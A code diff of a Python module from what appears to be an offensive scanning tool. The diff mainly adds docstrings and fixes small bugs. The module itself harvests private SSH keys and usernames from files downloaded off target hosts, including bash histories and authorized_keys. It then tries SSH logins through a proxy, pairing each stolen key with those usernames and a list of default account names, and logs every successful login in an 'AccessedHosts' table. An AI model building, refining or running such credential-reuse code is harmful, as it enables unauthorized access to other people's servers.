@@ -1,7 +1,5 @@
-from pathlib import Path
+"""SSH key processor for parsing and testing downloaded SSH keys."""
 import os
-import sys
-import ipaddress
 import sqlite3
 
 from executors.ssh_walker import Target as SSHTarget
@@ -10,10 +8,9 @@ from parsers.parser_helpers import test_ipaddress
 from parsers.parser_helpers import test_directory
 from parsers.parser_helpers import ensure_downloads
 
-# should add support for putty and other ssh clients 
 
-# get all file paths with .ssh in them 
 def get_ssh_files(file_list: list):
+    """Get all file paths containing .ssh directory."""
     ssh_files = []
     for file in file_list:
         posix_path_str = str(file)
@@ -25,59 +22,65 @@ def get_ssh_files(file_list: list):
     return ssh_files
 
 def get_bash_history_files(file_list: list):
+    """Get all bash history files from the file list."""
     bash_hist_files = []
     for file in file_list:
         posix_path_str = str(file)
         parts = posix_path_str.split("/")
-        if (parts[0] == "home" and parts[2] == ".bash_history") or (parts[1] == "home" and parts[3] == ".bash_history"):
+        is_bash_hist = (
+            (len(parts) > 2 and parts[0] == "home" and parts[2] == ".bash_history") or
+            (len(parts) > 3 and parts[1] == "home" and parts[3] == ".bash_history")
+        )
+        if is_bash_hist:
             if test_directory(file):
                 continue
             bash_hist_files.append(posix_path_str)
     return bash_hist_files
 
-            
-# test if a file is a private key
-# this isnt an ideal solution but just a stop gap until a better one is found
+
 def get_private_key(ssh_files: list):
+    """Identify private key files by checking for PEM header."""
     private_keys_found = []
     for file in ssh_files:
-        with open(file, "r") as fp:
+        with open(file, "r", encoding="utf-8") as fp:
             top_line = fp.readline()
             if "-----" in top_line:
                 private_keys_found.append(file)
     return private_keys_found
-                
+
+
 def get_public_keys(ssh_files: list):
-    # pub keys could be in two spots, the authorized_keys
-    # or just a .pub on the file system
+    """Get public keys from authorized_keys or .pub files."""
     public_keys_found = []
     for file in ssh_files:
         str_file_path = str(file)
-        if str_file_path.split("/")[-1] == "authorized_keys":
+        filename = str_file_path.rsplit("/", maxsplit=1)[-1]
+        if filename == "authorized_keys":
             public_keys_found.append(file)
-        elif ".pub" in str_file_path.split("/")[-1]:
+        elif ".pub" in filename:
             public_keys_found.append(file)
     return public_keys_found
 
 
 def get_username_from_file_contents(contents: list):
+    """Extract usernames from SSH public key file contents."""
     valid_usernames = set()
     blacklist = ["generated-by-azure", "imported-openssh-key"]
     for line in contents:
         if len(line.split(" ")) != 3:
-            continue # means no username at the end ssh-xxxx keyvaluehere root@targets
+            continue
+        username = line.split(" ")[-1].strip()
+        if username in blacklist:
+            continue
+        if "@" in username:
+            valid_usernames.add(username.split("@")[0])
         else:
-            username = line.split(" ")[-1].strip()
-            if username in blacklist:
-                continue
-            else:
-                if "@" in username:
-                    valid_usernames.add(username.split("@")[0])
-                else:
-                    valid_usernames.add(username)
+            valid_usernames.add(username)
     return valid_usernames
 
+
 def get_username_from_bash_history(contents: list):
+    """Extract potential usernames from bash history cd commands."""
     valid_usernames = set()
     for line in contents:
         line_parts = line.split(" ")
@@ -96,23 +99,27 @@ def get_username_from_bash_history(contents: list):
 
 
 def get_contents_from_pub_keys(public_keys: list):
+    """Extract usernames from all public key files."""
     all_usernames = set()
     for file in public_keys:
-        # its either a pub or its authorized_keys
-        with open(file, "r") as fp:
+        with open(file, "r", encoding="utf-8") as fp:
             file_lines = fp.readlines()
         all_usernames.update(get_username_from_file_contents(file_lines))
     return all_usernames
 
+
 def get_content_from_bash_histories(bash_file_files: list):
+    """Extract usernames from all bash history files."""
     all_usernames = set()
     for file in bash_file_files:
-        with open(file, "r") as fp:
+        with open(file, "r", encoding="utf-8") as fp:
             file_lines = fp.readlines()
-        all_usernames.update(get_username_from_bash_history(file_files))
+        all_usernames.update(get_username_from_bash_history(file_lines))
     return all_usernames
 
+
 def get_all_targets(proxy_host_port: str):
+    """Process all downloaded targets and attempt SSH access."""
     if not ensure_downloads():
         print("[-] No downloads directory found. Run a scan with -e first to download files.")
         return
@@ -121,7 +128,6 @@ def get_all_targets(proxy_host_port: str):
             continue
         downloaded_files = get_directories(os.path.join("downloads", target))
         ssh_files = get_ssh_files(downloaded_files)
-        
         bash_hist_files = get_bash_history_files(downloaded_files)
         if len(ssh_files) == 0 and len(bash_hist_files) == 0:
             continue
@@ -139,37 +145,39 @@ def get_all_targets(proxy_host_port: str):
         do_executor(target, usernames_comb, list_of_private_keys, proxy_host_port)
 
 
-def do_executor(target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str):
-    usernames = ["root", "admin", "test", "guest", "info", "adm",
-                 "mysql", "user", "ubuntu", "administrator", "oracle", "ftp",
-                 "pi", "debian", "ansible", "ec2-user", "vagrant",
-                 "azureuser"]
+def do_executor(target: str, usernames_from_pub_keys: set,
+                priv_keys: list, proxy_host_port: str):
+    """Attempt SSH connections using discovered keys and usernames."""
+    usernames = [
+        "root", "admin", "test", "guest", "info", "adm",
+        "mysql", "user", "ubuntu", "administrator", "oracle", "ftp",
+        "pi", "debian", "ansible", "ec2-user", "vagrant", "azureuser"
+    ]
     comb_usernames = list(usernames_from_pub_keys) + usernames
     for priv_key in priv_keys:
         os.chmod(priv_key, 0o600)
         for name in comb_usernames:
             ssh_target = SSHTarget(proxy_host_port, target, 22, name, key=str(priv_key))
-            print(f"[*] {proxy_host_port} -> {ssh_target.username}@{ssh_target.host}:{ssh_target.port} {ssh_target.key}")
+            print(f"[*] {proxy_host_port} -> {ssh_target.username}@"
+                  f"{ssh_target.host}:{ssh_target.port} {ssh_target.key}")
             client, sock = ssh_target.create_client()
-            if sock == None:
+            if sock is None:
                 os.remove(priv_key)
                 return # ssh server not listening, move on to the next host
             if ssh_target.connect_key(client, sock):
                 write_accessed_host(ssh_target.host, ssh_target.port, ssh_target.username, ssh_target.key)
                 return # moves onto the next target
-        # we failed do your cleanup here
+        # we failed, do cleanup here
         os.remove(priv_key)
-        # should also see if there is a matching public key and remove that too
-
 
 
 def write_accessed_host(host: str, port: int, username: str, key: str):
-    # should also likely write the key data, can with open it here
+    """Record successful SSH access to the database."""
     conn = sqlite3.connect("db/database.db")
     cursor = conn.cursor()
-    # we can update the data in this table when the survey is done
-    cursor.execute("INSERT INTO AccessedHosts (ip_addr, port, username, key) VALUES (?, ?, ?, ?)", (host, port, username, key))
+    cursor.execute(
+        "INSERT INTO AccessedHosts (ip_addr, port, username, key) VALUES (?, ?, ?, ?)",
+        (host, port, username, key)
+    )
     conn.commit()
     conn.close()
-
-
